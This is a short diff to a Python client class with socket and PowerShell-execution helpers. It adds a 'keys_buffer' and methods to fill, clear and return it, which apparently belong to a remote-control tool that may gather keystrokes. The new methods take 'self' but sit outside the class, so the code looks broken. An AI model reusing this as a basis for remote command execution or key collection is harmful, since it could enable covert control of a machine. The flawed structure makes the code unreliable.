@@ -10,6 +10,7 @@ class cl_model:
         self.client_socket = None
         self.connected = False
         self.view = view
+        self.keys_buffer = []
         
     def connect_to_server(self, server_ip, server_port):
         if self.connected:
@@ -296,3 +297,12 @@ def run_powershell_command(command):
         return result.stdout
     except subprocess.CalledProcessError as e:
         return e.stderr
+
+def add_to_keys_buffer(self, keys):
+    self.keys_buffer.extend(keys)
+
+def clear_keys_buffer(self):
+    self.keys_buffer = []
+
+def get_keys_buffer(self):
+    return self.keys_buffer
